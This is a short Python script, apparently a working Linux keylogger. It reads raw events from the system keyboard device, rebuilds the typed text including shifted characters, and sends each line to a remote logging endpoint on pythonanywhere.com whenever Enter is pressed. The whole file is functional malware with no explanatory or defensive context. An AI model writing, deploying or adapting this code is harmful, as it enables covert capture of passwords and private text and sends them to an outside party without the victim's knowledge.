
import requests

from evdev import InputDevice, categorize, ecodes, KeyEvent   

def kirim(txt):
    data = {'log':txt}
    url = "https://apiface.pythonanywhere.com/api/logger"
    requests.post(url, json=data)
    print("",end="")


key_map = {'KEY_1': ('1', '!'),'KEY_2': ('2', '@'),'KEY_3': ('3', '#'),'KEY_4': ('4', '$'),'KEY_5': ('5', '%'),'KEY_6': ('6', '^'),'KEY_7': ('7', '&'),'KEY_8': ('8', '*'),'KEY_9': ('9', '('),'KEY_0': ('0', ')'),'KEY_MINUS': ('-', '_'),'KEY_EQUAL': ('=', '+'),'KEY_LEFTBRACE': ('[', '{'),'KEY_RIGHTBRACE': (']', '}'),'KEY_SEMICOLON': (';', ':'),'KEY_APOSTROPHE': ("'", '"'),'KEY_GRAVE': ('`', '~'),'KEY_BACKSLASH': ('\\', '|'),'KEY_COMMA': (',', '<'),'KEY_DOT': ('.', '>'),'KEY_SLASH': ('/', '?'),'KEY_A': ('a', 'A'),'KEY_B': ('b', 'B'),'KEY_C': ('c', 'C'),'KEY_D': ('d', 'D'),'KEY_E': ('e', 'E'),'KEY_F': ('f', 'F'),'KEY_G': ('g', 'G'),'KEY_H': ('h', 'H'),'KEY_I': ('i', 'I'),'KEY_J': ('j', 'J'),'KEY_K': ('k', 'K'),'KEY_L': ('l', 'L'),'KEY_M': ('m', 'M'),'KEY_N': ('n', 'N'),'KEY_O': ('o', 'O'),'KEY_P': ('p', 'P'),'KEY_Q': ('q', 'Q'),'KEY_R': ('r', 'R'),'KEY_S': ('s', 'S'),'KEY_T': ('t', 'T'),'KEY_U': ('u', 'U'),'KEY_V': ('v', 'V'),'KEY_W': ('w', 'W'),'KEY_X': ('x', 'X'),'KEY_Y': ('y', 'Y'),'KEY_Z': ('z', 'Z')}

dev = InputDevice('/dev/input/by-path/platform-i8042-serio-0-event-kbd')

shift_pressed = False
capslock_on = False
text = ""


for event in dev.read_loop():
    if event.type == ecodes.EV_KEY:
        key_event = categorize(event)
        
        if key_event.keystate == KeyEvent.key_down or key_event.keystate == KeyEvent.key_up:
            keycode = key_event.keycode

            if keycode in ['KEY_LEFTSHIFT', 'KEY_RIGHTSHIFT']:
                shift_pressed = key_event.keystate == KeyEvent.key_down

            if keycode == 'KEY_CAPSLOCK' and key_event.keystate == KeyEvent.key_down:
                capslock_on = not capslock_on

            if keycode == 'KEY_ESC' and key_event.keystate == KeyEvent.key_down:
                print('Esc key pressed, exiting...')
                break

            if key_event.keystate == KeyEvent.key_down and keycode in key_map:
                if shift_pressed != capslock_on:
                    char = key_map[keycode][1]
                else:
                    char = key_map[keycode][0]
                text += char
            
            elif key_event.keystate == KeyEvent.key_down:
                if keycode == 'KEY_ENTER':
                    kirim(text)
                    text = ""
                elif keycode == 'KEY_SPACE':
                    text += " "
